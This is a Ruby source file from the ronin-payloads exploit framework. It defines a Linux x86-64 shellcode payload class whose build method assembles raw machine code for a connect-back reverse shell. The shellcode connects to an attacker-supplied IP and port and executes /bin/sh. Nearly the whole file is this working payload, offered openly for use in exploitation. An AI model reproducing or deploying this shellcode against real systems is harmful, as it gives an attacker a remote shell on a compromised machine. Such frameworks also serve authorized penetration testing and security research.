# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/reverse_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module X86_64
          #
          # Linux x86-64 shellcode that spawns a connect back reverse shell.
          #
          class ReverseShell < ReverseShellPayload

            register 'shellcode/linux/x86_64/reverse_shell'

            arch :x86_64
            os :linux

            author 'Russell Willis', email: 'codinguy@gmail.com'

            summary 'Linux x86-64 reverse shell shellcode'
            description <<~DESC
            Linux x86-64 shellcode that spawns a connect back reverse shell.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-857.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" \
                         "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" \
                         "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" \
                         "\x02#{packed_port}\xc7\x44\x24\x04#{packed_ipv4}\x48\x89\xe6\x6a\x10" \
                         "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" \
                         "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" \
                         "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" \
                         "\x5f\x6a\x3b\x58\x0f\x05".b
            end

          end
        end
      end
    end
  end
end
